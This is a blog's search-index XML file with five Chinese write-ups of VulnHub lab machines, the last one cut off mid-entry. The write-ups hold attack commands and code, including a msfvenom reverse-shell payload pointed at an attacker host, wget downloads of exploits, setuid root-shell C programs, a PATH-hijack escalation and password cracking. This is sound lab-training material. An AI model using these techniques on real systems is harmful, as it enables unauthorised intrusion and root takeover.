<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>vulnhub靶场DomDom</title>
      <link href="/2022/11/16/toc-heading-16/"/>
      <url>/2022/11/16/toc-heading-16/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="0x000-靶场描述"><a href="#0x000-靶场描述" class="headerlink" title="0x000 靶场描述"></a>0x000 靶场描述</h3><hr><p>你对PHP程序的理解程度如何？您对 Linux 错误配置有多熟悉？此图像将涵盖高级 Web 攻击、开箱即用的思维和最新的安全漏洞。</p><p>此靶场没有flag，获取到root权限即可。。。</p><hr><h3 id="0x001-靶场下载"><a href="#0x001-靶场下载" class="headerlink" title="0x001 靶场下载"></a>0x001 靶场下载</h3><hr><p><a href="https://www.vulnhub.com/entry/domdom-1,328/">https://www.vulnhub.com/entry/domdom-1,328/</a></p><hr><h3 id="0x002-信息收集"><a href="#0x002-信息收集" class="headerlink" title="0x002 信息收集"></a>0x002 信息收集</h3><hr><h4 id="探测存活主机"><a href="#探测存活主机" class="headerlink" title="探测存活主机"></a>探测存活主机</h4><p><code>netdiscover -r 192.168.1.0/24</code></p><p><img src="https://cdnjson.com/images/2022/11/16/143e6c67d2aa43da7.png" alt="探测存活主机"></p><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p><code>nmap -sS -sV -A -p 1-65535 192.168.1.106</code></p><p><img src="https://cdnjson.com/images/2022/11/16/2f2eb39d751aa4b4d.png" alt="端口扫描"></p><h4 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h4><p><code>dirsearch -u http://192.168.1.106/</code></p><p><img src="https://cdnjson.com/images/2022/11/16/3ad02431eef49650d.png" alt="目录扫描"></p><hr><h3 id="0x003-命令执行漏洞"><a href="#0x003-命令执行漏洞" class="headerlink" title="0x003 命令执行漏洞"></a>0x003 命令执行漏洞</h3><hr><p>访问网站</p><p><img src="https://cdnjson.com/images/2022/11/16/42a8f178334931af5.png" alt="index.php"></p><p><img src="https://cdnjson.com/images/2022/11/16/50facb38fb3fcc13d.png" alt="admin.php"></p><p>使用burpsuite抓包测试，发现admin.php存在命令执行漏洞；因此可以执行一个反弹shell从而getshell</p><p><img src="https://cdnjson.com/images/2022/11/16/6f5197b65b2507978.png" alt="index.php"></p><p><img src="https://cdnjson.com/images/2022/11/16/7316d820ef88b46e2.png" alt="admin.php"></p><p><a href="https://www.revshells.com/">https://www.revshells.com/</a> 网站生成反弹shell</p><p><img src="https://cdnjson.com/images/2022/11/16/8db8fbad4169f24c0.png" alt="php_shell"></p><p>成功获取到shell</p><p><img src="https://cdnjson.com/images/2022/11/16/9721feaae6743b7a5.png" alt="shell"></p><p>切换交互模式：<code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code> </p><hr><h3 id="0x004-提权"><a href="#0x004-提权" class="headerlink" title="0x004 提权"></a>0x004 提权</h3><hr><h4 id="脏牛提权"><a href="#脏牛提权" class="headerlink" title="脏牛提权"></a>脏牛提权</h4><p>uname -a 查看当前系统版本为 Linux ubuntu 4.4.0-21-generic</p><p>可以下载漏洞检测脚本进行检测 <a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></p><p>检测到CVE-2016-5195，典型的脏牛提权漏洞</p><p><img src="https://cdnjson.com/images/2022/11/16/1047886455b0a4f920.png" alt="CVE-2016-5195"></p><p>下载利用exp：<code>wget https://www.exploit-db.com/download/40616</code></p><pre class=" language-bash"><code class="language-bash"><span class="token function">mv</span> 40616 exp.cgcc exp.c -o exp -pthread<span class="token function">chmod</span> +x exp</code></pre><blockquote><p>这里编译的时候可能会报错，不用管</p></blockquote><p><img src="https://cdnjson.com/images/2022/11/16/1181836ec9e9664771.png" alt="root"></p><h4 id="root密码登陆提权"><a href="#root密码登陆提权" class="headerlink" title="root密码登陆提权"></a>root密码登陆提权</h4><p>查找特殊权限的文件：<code>getcap -r / 2&gt;/dev/null</code></p><p><img src="https://cdnjson.com/images/2022/11/16/128f7671c0e50cb324.png" alt="getcap"></p><p>打包用户 domom 目录</p><pre class=" language-bash"><code class="language-bash"><span class="token function">tar</span> -cvf domom.tar /home/domom<span class="token function">tar</span> -xvf domom.tar<span class="token function">cat</span> README.md</code></pre><p>找到了root密码：<code>Mj7AGmPR-m&amp;Vf&gt;Ry{}LJRBS5nc+*V.#a</code></p><p><img src="https://cdnjson.com/images/2022/11/16/13f91a89e577cb232e.png" alt="root"></p>]]></content>
      
      
      <categories>
          
          <category> vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web Security </tag>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub靶场Trollcave</title>
      <link href="/2022/11/15/toc-heading-15/"/>
      <url>/2022/11/15/toc-heading-15/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="0x000-靶场描述"><a href="#0x000-靶场描述" class="headerlink" title="0x000 靶场描述"></a>0x000 靶场描述</h3><hr><p>Trollcave是一个易受攻击的VM，在Vulnhub和信息安全战争游戏的传统中。你从一个你一无所知的虚拟机开始 - 没有用户名，没有密码，只是你可以在网络上看到的东西。在这种情况下，您将看到一个简单的社区博客网站，其中包含一群用户。从这个初始点开始，您将枚举计算机的运行服务和一般特征，并设计通过查找和利用漏洞和错误配置来完全控制它的方法。</p><p>您的第一个目标是滥用计算机上的服务来获取未经授权的 shell 访问权限。您的最终目标是读取用户主目录中的文本文件）。root/flag.txt</p><hr><h3 id="0x001-靶场下载"><a href="#0x001-靶场下载" class="headerlink" title="0x001 靶场下载"></a>0x001 靶场下载</h3><hr><p><a href="https://www.vulnhub.com/entry/trollcave-12,230/">https://www.vulnhub.com/entry/trollcave-12,230/</a></p><hr><h3 id="0x002-信息收集"><a href="#0x002-信息收集" class="headerlink" title="0x002 信息收集"></a>0x002 信息收集</h3><hr><h4 id="探测存活主机"><a href="#探测存活主机" class="headerlink" title="探测存活主机"></a>探测存活主机</h4><p><code>netdiscover -r 192.168.1.0/24</code></p><p><img src="https://cdnjson.com/images/2022/11/16/1.png" alt="探测存活主机"></p><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p><code>nmap -sS -sV -A -p 1-65535 192.168.1.106</code></p><p><img src="https://cdnjson.com/images/2022/11/16/2.png" alt="端口扫描"></p><p>访问网站，发现有密码重置漏洞，并且还给了一个password_resets目录，访问之后发现拒绝访问，尝试目录扫描。</p><p><img src="https://cdnjson.com/images/2022/11/16/3.png" alt="image"></p><h4 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h4><p><code>dirsearch -u http://192.168.1.106/</code></p><p><img src="https://cdnjson.com/images/2022/11/16/5.png" alt="目录扫描"></p><hr><h3 id="0x003-漏洞利用"><a href="#0x003-漏洞利用" class="headerlink" title="0x003 漏洞利用"></a>0x003 漏洞利用</h3><hr><h4 id="密码重置漏洞"><a href="#密码重置漏洞" class="headerlink" title="密码重置漏洞"></a>密码重置漏洞</h4><p>访问 <a href="http://192.168.1.102/password_resets/new">http://192.168.1.102/password_resets/new</a> 会来到密码重置页面，尝试重置xer用户密码。</p><p><img src="https://cdnjson.com/images/2022/11/16/6.png" alt="password_resets"></p><p>访问 <a href="http://192.168.1.102/password_resets/edit.b4vwNXs2bz9dWJGAaqc1Cw?name=xer">http://192.168.1.102/password_resets/edit.b4vwNXs2bz9dWJGAaqc1Cw?name=xer</a> 填写密码即可重置成功。</p><p>然后进行登陆xer用户，查找可以getshell的地方，找到一个文件上传，但是权限不够。。</p><p>在users用户界面发现 king 是管理员用户，尝试重置密码。</p><p><img src="https://cdnjson.com/images/2022/11/16/7.png" alt="users"></p><p>按照上面的操作，重置king用户的密码，但是没权限，然后尝试将 <a href="http://192.168.1.102/password_resets/edit.b4vwNXs2bz9dWJGAaqc1Cw?name=xer">http://192.168.1.102/password_resets/edit.b4vwNXs2bz9dWJGAaqc1Cw?name=xer</a> 改为 <a href="http://192.168.1.102/password_resets/edit.b4vwNXs2bz9dWJGAaqc1Cw?name=king">http://192.168.1.102/password_resets/edit.b4vwNXs2bz9dWJGAaqc1Cw?name=king</a> 访问之后，发现可以重置密码，成功登陆king管理员账号。</p><p><img src="https://cdnjson.com/images/2022/11/16/8.png" alt="king"></p><h4 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h4><p>然后准备上传文件getshell，但是显示没权限，查看设置里面是否没有开启；发现没有开启，打开后可以正常上传。</p><p><img src="https://cdnjson.com/images/2022/11/16/9.png" alt="upload"></p><p>上传一个php木马文件，成功上传，但是没有解析。抓包分析，发现上传的文件可以更改路径，因为开启了22端口，可以上传一个公钥文件，从而getshell。</p><p>kali生成密钥，然后上传到目标文件夹下；但是不知道网站的用户是什么。。。查看网站发现了如下用户rails，并且在 <a href="https://github.com/rails/rails">https://github.com/rails/rails</a> 发现了网站源码，此网站安装时会默认创建一个rails用户。</p><p><img src="https://cdnjson.com/images/2022/11/16/11.png" alt="rails"></p><pre class=" language-bash"><code class="language-bash">ssh-keygen -f rails<span class="token function">mv</span> rails.pub authorized_key</code></pre><p><img src="https://cdnjson.com/images/2022/11/16/12.png" alt="authorized_keys"></p><h4 id="ssh远程登陆"><a href="#ssh远程登陆" class="headerlink" title="ssh远程登陆"></a>ssh远程登陆</h4><pre class=" language-bash"><code class="language-bash"><span class="token function">mv</span> rails id_rsa-rails <span class="token function">chmod</span> 600 id_rsa-rails<span class="token function">ssh</span> -i id_rsa-rails rails@192.168.1.102</code></pre><p><img src="https://cdnjson.com/images/2022/11/16/13.png" alt="ssh"></p><hr><h3 id="0x004-提权"><a href="#0x004-提权" class="headerlink" title="0x004 提权"></a>0x004 提权</h3><hr><h4 id="cve-2017-16995-提权"><a href="#cve-2017-16995-提权" class="headerlink" title="cve-2017-16995 提权"></a>cve-2017-16995 提权</h4><p>cat /etc/lsb-release 查看当前系统版本</p><p><img src="https://cdnjson.com/images/2022/11/16/14.png" alt="version"></p><p>在kali使用命令 searchsploit Ubuntu 14.04 查找 Ubuntu 14.04 版本相关漏洞</p><p><img src="https://cdnjson.com/images/2022/11/16/13_1.png" alt="45010.c"></p><p>在本地对漏洞利用exp进行编译，然后使用wget上传到目标机，赋予执行权限，成功提权到root权限。</p><p><img src="https://cdnjson.com/images/2022/11/16/15.png" alt="root"></p><h4 id="通过其他方式提权"><a href="#通过其他方式提权" class="headerlink" title="通过其他方式提权"></a>通过其他方式提权</h4><p>查看网络信息，发现存在PostgreSQL数据库5432端口和node服务8888端口，并且只允许本地访问。</p><p><img src="https://cdnjson.com/images/2022/11/16/17.png" alt="netstat"></p><p>查看网站的配置目录，发现里面有数据库的配置文件，查看发现了数据库的账号密码<br>username: tc<br>password: sowvillagedinnermoment</p><p><img src="https://cdnjson.com/images/2022/11/16/18.png" alt="PostgreSQL"></p><p>sqlite3 信息搜索，查看所有用户，但是好像没什么用，暂时先放一放。</p><p><img src="https://cdnjson.com/images/2022/11/16/19.png" alt="PostgreSQL"></p><p>登陆PostgreSQL数据库</p><p>Shift + ~ + C 打开ssh开启5432本地转发</p><p>成功登陆PostgreSQL数据库，但是表里面没有信息。</p><p><img src="https://cdnjson.com/images/2022/11/16/20.png" alt="PostgreSQL"></p><p>Shift + ~ + C 打开ssh开启8888本地转发，查看8888端口页面是什么。</p><p>burpsuite抓包，发现可以执行命令，但是命令来源于calc</p><p><img src="https://cdnjson.com/images/2022/11/16/21.png" alt="8888端口"></p><p>使用 find / -name calc -print 2&gt;&amp;1 | grep -v ‘Permission denied’ 命令查找calc</p><p><img src="https://cdnjson.com/images/2022/11/16/22.png" alt="calc"></p><p>分析源代码，发现 var exec = require(‘child_process’).exec; 这一句可以执行命令；但是不能直接返回执行命令的结果，只会返回一个对象；因此尝试读取文件内容写入到文件，但是发现不能写入，但是用户变了。</p><p><img src="https://cdnjson.com/images/2022/11/16/23.png" alt="calc.js"></p><p><img src="https://cdnjson.com/images/2022/11/16/24.png" alt="image"></p><p>此时可以创建一个exp文件，然后上传到目标机，利用命令执行让他隶属king用户</p><blockquote><p>这里要将setreuid改为king的用户id</p></blockquote><pre class=" language-C"><code class="language-C">#include <stdio.h>#include <stdlib.h>#include <unistd.h>int main(int argc,char *argv[]){    setreuid(1000,1000);     execve("/bin/sh",NULL,NULL);}</code></pre><p>使用wget上传，然后在目标机新建1.sh文件</p><pre class=" language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span><span class="token function">cp</span> /tmp/exp /home/king/exp<span class="token function">chmod</span> 4755 /home/king/exp</code></pre><blockquote><p>这里一定要赋予4755权限</p></blockquote><p><img src="https://cdnjson.com/images/2022/11/16/25.png" alt="king组"></p><p>运行exp，成功提权到root权限。</p><p><img src="https://cdnjson.com/images/2022/11/16/26.png" alt="root"></p><hr><h3 id="0x005-查找flag"><a href="#0x005-查找flag" class="headerlink" title="0x005 查找flag"></a>0x005 查找flag</h3><hr><p><img src="https://cdnjson.com/images/2022/11/16/16.png" alt="flag"></p>]]></content>
      
      
      <categories>
          
          <category> vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web Security </tag>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub靶场Os-ByteSec</title>
      <link href="/2022/11/14/toc-heading-14/"/>
      <url>/2022/11/14/toc-heading-14/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="0x000-靶场描述"><a href="#0x000-靶场描述" class="headerlink" title="0x000 靶场描述"></a>0x000 靶场描述</h3><hr><p>难度：中级<br>flag：2个flag第一个用户和第二个root<br>学习：利用|中小企业|枚举|速记|权限提升<br>联系：<a href="https://www.linkedin.com/in/rahulgehlaut/">https://www.linkedin.com/in/rahulgehlaut/</a></p><hr><h3 id="0x001-靶场下载"><a href="#0x001-靶场下载" class="headerlink" title="0x001 靶场下载"></a>0x001 靶场下载</h3><hr><p><a href="https://www.vulnhub.com/entry/hacknos-os-bytesec,393/">https://www.vulnhub.com/entry/hacknos-os-bytesec,393/</a></p><hr><h3 id="0x002-信息收集"><a href="#0x002-信息收集" class="headerlink" title="0x002 信息收集"></a>0x002 信息收集</h3><hr><h4 id="探测存活主机"><a href="#探测存活主机" class="headerlink" title="探测存活主机"></a>探测存活主机</h4><p><code>netdiscover -r 192.168.1.0/24</code></p><p><img src="https://cdnjson.com/images/2022/11/14/1b9b9b63bd18d1269.png" alt="探测存活主机"></p><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p><code>nmap -sS -sV -A -p 1-65535 192.168.1.106</code></p><p><img src="https://cdnjson.com/images/2022/11/14/2.png" alt="端口扫描"></p><h4 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h4><p><code>dirsearch -u http://192.168.1.106/</code></p><p><img src="https://cdnjson.com/images/2022/11/14/3.png" alt="目录扫描"></p><p>访问扫描到的目录，发现基本都是图片，没有什么可以利用的信息</p><hr><h3 id="0x003-smb服务漏洞"><a href="#0x003-smb服务漏洞" class="headerlink" title="0x003 smb服务漏洞"></a>0x003 smb服务漏洞</h3><hr><blockquote><p>这里查看了别人的利用过程 <a href="https://www.cnblogs.com/f-carey/p/15953802.html#tid-6a3MAx">https://www.cnblogs.com/f-carey/p/15953802.html#tid-6a3MAx</a></p></blockquote><h4 id="检测smb服务漏洞"><a href="#检测smb服务漏洞" class="headerlink" title="检测smb服务漏洞"></a>检测smb服务漏洞</h4><p>根据前面端口扫描的结果，发现没有存在可以利用的地方。</p><p><img src="https://cdnjson.com/images/2022/11/14/469266bbba5012b33.png" alt="smb服务扫描"></p><h4 id="使用smbmap枚举smb用户信息"><a href="#使用smbmap枚举smb用户信息" class="headerlink" title="使用smbmap枚举smb用户信息"></a>使用smbmap枚举smb用户信息</h4><p><code>smbmap -H 192.168.1.106</code></p><p><img src="https://cdnjson.com/images/2022/11/14/4_18b9e32221ffc1364.png" alt="smbmap"></p><h4 id="使用enum4linux检测目标系统上的smb服务"><a href="#使用enum4linux检测目标系统上的smb服务" class="headerlink" title="使用enum4linux检测目标系统上的smb服务"></a>使用enum4linux检测目标系统上的smb服务</h4><p><code>enum4linux 192.168.1.106</code></p><p><img src="https://cdnjson.com/images/2022/11/14/4_2fb8811aad1c87c3a.png" alt="enum4linux"></p><h4 id="使用-smbclient-访问目录"><a href="#使用-smbclient-访问目录" class="headerlink" title="使用 smbclient 访问目录"></a>使用 smbclient 访问目录</h4><p><code>smbclient //192.168.1.106/smb -U smb</code></p><p><img src="https://cdnjson.com/images/2022/11/14/5.png" alt="smbclient"></p><p>发现一个main.txt文件和一个safe.zip压缩文件，下载到本地进行查看</p><p>main.txt  没有什么可用信息<br>safe.zip  需要输入密码</p><h4 id="fcrackzip-破解压缩文件"><a href="#fcrackzip-破解压缩文件" class="headerlink" title="fcrackzip 破解压缩文件"></a>fcrackzip 破解压缩文件</h4><p><code>fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u safe.zip</code></p><p><img src="https://cdnjson.com/images/2022/11/14/7.png" alt="fcrackzip"></p><p>解压后，里面一个图片和一个cap文件，使用wireshark打开，但是没有发现什么可用信息。</p><p><img src="https://cdnjson.com/images/2022/11/14/8.png" alt="wireshark"></p><h4 id="使用aircrack-ng暴力猜解"><a href="#使用aircrack-ng暴力猜解" class="headerlink" title="使用aircrack-ng暴力猜解"></a>使用aircrack-ng暴力猜解</h4><p>猜解出账号密码：blackjax/snowflake</p><p><code>aircrack-ng -w /usr/share/wordlists/rockyou.txt user.cap</code></p><p><img src="https://cdnjson.com/images/2022/11/14/9.png" alt="aircrack-ng"></p><h4 id="ssh远程登陆"><a href="#ssh远程登陆" class="headerlink" title="ssh远程登陆"></a>ssh远程登陆</h4><p><code>ssh blackjax@192.168.1.106 -p 2525</code><br><code>python3 -c 'import pty;pty.spawn("/bin/bash")'  #切换为交互模式</code></p><p><img src="https://cdnjson.com/images/2022/11/14/10.png" alt="ssh"></p><hr><h3 id="0x004-环境变量挟持提权"><a href="#0x004-环境变量挟持提权" class="headerlink" title="0x004 环境变量挟持提权"></a>0x004 环境变量挟持提权</h3><hr><h4 id="查找suid权限的文件"><a href="#查找suid权限的文件" class="headerlink" title="查找suid权限的文件"></a>查找suid权限的文件</h4><p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p><p><img src="https://cdnjson.com/images/2022/11/14/11.png" alt="suid"></p><h4 id="分析netscan文件"><a href="#分析netscan文件" class="headerlink" title="分析netscan文件"></a>分析netscan文件</h4><p><img src="https://cdnjson.com/images/2022/11/14/12.png" alt="netscan"></p><p><code>xxd /usr/bin/netscan | less</code></p><p>发现netscan文件会调用netstat -anpt命令。</p><p><img src="https://cdnjson.com/images/2022/11/14/13.png" alt="less"></p><h4 id="提权root"><a href="#提权root" class="headerlink" title="提权root"></a>提权root</h4><pre class=" language-bash"><code class="language-bash"><span class="token keyword">echo</span> <span class="token string">"/bin/sh"</span> <span class="token operator">></span>netstat<span class="token function">chmod</span> 777 <span class="token function">netstat</span><span class="token function">export</span> PATH<span class="token operator">=</span>/tmp:<span class="token variable">$PATH</span></code></pre><p><img src="https://cdnjson.com/images/2022/11/14/14.png" alt="提权"></p><hr><h3 id="0x005-查找flag"><a href="#0x005-查找flag" class="headerlink" title="0x005 查找flag"></a>0x005 查找flag</h3><hr><p><img src="https://cdnjson.com/images/2022/11/14/15.png" alt="flag"></p>]]></content>
      
      
      <categories>
          
          <category> vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web Security </tag>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub靶场Os-hackNos-3</title>
      <link href="/2022/11/13/toc-heading-13/"/>
      <url>/2022/11/13/toc-heading-13/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="0x000-靶场描述"><a href="#0x000-靶场描述" class="headerlink" title="0x000 靶场描述"></a>0x000 靶场描述</h3><hr><p>难度：中级<br>flag：2 个flag第一个用户和第二个root<br>学习：Web 应用程序|枚举|权限提升<br>网站： <a href="http://www.hacknos.com/">www.hacknos.com</a><br>联系我们 ： @rahul_gehlaut</p><hr><h3 id="0x001-靶场下载"><a href="#0x001-靶场下载" class="headerlink" title="0x001 靶场下载"></a>0x001 靶场下载</h3><hr><p><a href="https://www.vulnhub.com/entry/hacknos-os-hacknos-3,410/">https://www.vulnhub.com/entry/hacknos-os-hacknos-3,410/</a></p><hr><h3 id="0x002-信息收集"><a href="#0x002-信息收集" class="headerlink" title="0x002 信息收集"></a>0x002 信息收集</h3><hr><h4 id="探测存活主机"><a href="#探测存活主机" class="headerlink" title="探测存活主机"></a>探测存活主机</h4><p><code>sudo netdiscover -r 192.168.1.0/24</code></p><p><img src="https://cdnjson.com/images/2022/11/13/1.png" alt="探测存活主机"></p><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p><code>nmap -sS -sV -Pn -A -p 1-65535 192.168.1.100</code></p><p><img src="https://cdnjson.com/images/2022/11/13/2.png" alt="端口扫描"></p><p>访问网站，发现页面下方有提示</p><p><img src="https://cdnjson.com/images/2022/11/13/3.png" alt="网站"></p><h4 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h4><p>对websec目录下再进行扫描，发现网站后台，访问之后发现账号是邮箱格式的，在目录扫描结果中发现有1.sql文件，尝试访问。</p><p><img src="https://cdnjson.com/images/2022/11/13/4.png" alt="目录扫描"></p><p>发现存在一个邮箱</p><p><img src="https://cdnjson.com/images/2022/11/13/5.png" alt="email"></p><h4 id="使用hydra爆破后台密码"><a href="#使用hydra爆破后台密码" class="headerlink" title="使用hydra爆破后台密码"></a>使用hydra爆破后台密码</h4><p>爆破之前，先用cewl对网站进行爬取，从而生成密码字典</p><blockquote><p>这里不能使用burpsuite进行抓包爆破。</p></blockquote><p><img src="https://cdnjson.com/images/2022/11/13/6.png" alt="hydra"></p><hr><h3 id="0x003-修改主题文件getshell"><a href="#0x003-修改主题文件getshell" class="headerlink" title="0x003 修改主题文件getshell"></a>0x003 修改主题文件getshell</h3><hr><p>使用账号密码登陆网站后台</p><p><img src="https://cdnjson.com/images/2022/11/13/7.png" alt="后台主页"></p><p><img src="https://cdnjson.com/images/2022/11/13/8.png" alt="主题文件"></p><p>访问 <a href="http://192.168.1.100/websec/themes/gila-blog/shell.php">http://192.168.1.100/websec/themes/gila-blog/shell.php</a> ，发现拒绝访问。</p><p>查看发现.htaccess文件拒绝访问.php后缀的文件，把.htaccess文件内容清除即可。</p><p><img src="https://cdnjson.com/images/2022/11/13/9.png" alt="htaccess"></p><p>使用蚁剑连接，成功上线。</p><p><img src="https://cdnjson.com/images/2022/11/13/10.png" alt="蚁剑"></p><h4 id="利用蚁剑上线msf"><a href="#利用蚁剑上线msf" class="headerlink" title="利用蚁剑上线msf"></a>利用蚁剑上线msf</h4><p>先使用命令生成一个elf文件，并将其通过蚁剑上传到目标服务器</p><p><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.106 LPORT=7777 -f elf -o reverse.elf</code></p><p>然后kali上开启msfconsole监听，成功上线</p><p>切换交互式shell。</p><p><code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code></p><p><img src="https://cdnjson.com/images/2022/11/13/14.png" alt="msfconsole"></p><hr><h3 id="0x004-利用cpulimit提权"><a href="#0x004-利用cpulimit提权" class="headerlink" title="0x004 利用cpulimit提权"></a>0x004 利用cpulimit提权</h3><hr><p>利用如下命令查找具有suid权限的命令</p><p><code>find /bin/bash -perm -u=s -type f 2&gt;/dev/null</code></p><p><img src="https://cdnjson.com/images/2022/11/13/11.png" alt="find"></p><p>通过网站 <a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a> 可以查看命令的详细使用方法。</p><p><img src="https://cdnjson.com/images/2022/11/13/123e6e63eb407e6a6e.png" alt="cpulimit"></p><p>先写一个 test.c 文件，然后进行编译</p><blockquote><p>这里尽量使用低版本进行编译，kali 2022版本编译的文件会导致提权失败。。。</p></blockquote><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">setreuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>编译为可执行文件</p><p><code>gcc test.c -o exp</code></p><p>利用如下命令下载到服务器，然后使用cpulimit命令进行提权</p><p><code>wget http://192.168.1.105/exp</code></p><p><img src="https://cdnjson.com/images/2022/11/13/15.png" alt="cpulimit"></p><hr><h3 id="0x005-查找flag"><a href="#0x005-查找flag" class="headerlink" title="0x005 查找flag"></a>0x005 查找flag</h3><hr><p>还是老地方，用户目录下的user.txt和root目录下的root.txt</p><p><img src="https://cdnjson.com/images/2022/11/13/16.png" alt="flag"></p>]]></content>
      
      
      <categories>
          
          <category> vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web Security </tag>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub靶场Os-hackNos-2</title>
      <link href="/2022/11/11/toc-heading-12/"/>
      <url>/2022/11/11/toc-heading-12/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="0x000-靶场描述"><a href="#0x000-靶场描述" class="headerlink" title="0x000 靶场描述"></a>0x000 靶场描述</h3><hr><p>难度：简单到中级<br>flag ： 2个flag第一个用户和第二个root<br>学习 ： Web 应用程序|枚举|密码破解</p><hr><h3 id="0x001-靶场下载"><a href="#0x001-靶场下载" class="headerlink" title="0x001 靶场下载"></a>0x001 靶场下载</h3><hr><p><a href="https://www.vulnhub.com/entry/hacknos-os-hacknos-21,403/">https://www.vulnhub.com/entry/hacknos-os-hacknos-21,403/</a></p><hr><h3 id="0x002-信息收集"><a href="#0x002-信息收集" class="headerlink" title="0x002 信息收集"></a>0x002 信息收集</h3><hr><h4 id="探测存活主机"><a href="#探测存活主机" class="headerlink" title="探测存活主机"></a>探测存活主机</h4><p><code>netdiscover -r 192.168.43.0/24</code></p><p><img src="https://cdnjson.com/images/2022/11/11/1.png" alt="探测存活主机"></p><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><p><code>nmap -sS -sV -A -p 1-65535 192.168.43.157</code></p><p><img src="https://cdnjson.com/images/2022/11/11/2.png" alt="端口扫描"></p><h4 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h4><p><code>dirsearch -u http://192.168.43.157</code></p><p><img src="https://cdnjson.com/images/2022/11/11/3.png" alt="目录扫描"></p><p>访问 <a href="http://192.168.43.157/tsweb/">http://192.168.43.157/tsweb/</a> 页面如下</p><p><img src="https://cdnjson.com/images/2022/11/11/4.png" alt="网站"></p><h4 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h4><p>使用wpscan工具进行扫描，发现存在文件包含漏洞</p><blockquote><p>这里使用wpscan要在 <a href="https://wpscan.com/">https://wpscan.com/</a> 官网注册获取API值</p></blockquote><p><code>wpscan --url http://192.168.43.157/tsweb -e vp --api-token API值</code></p><p><img src="https://cdnjson.com/images/2022/11/13/12.png" alt="wpscan"></p><p>查看 <a href="https://www.exploit-db.com/exploits/46537">https://www.exploit-db.com/exploits/46537</a> ，发现漏洞利用exp</p><p><img src="https://cdnjson.com/images/2022/11/11/8.png" alt="EXP"></p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>利用文件包含漏洞读取/etc/passwd文件的内容</p><p><img src="https://cdnjson.com/images/2022/11/11/6.png" 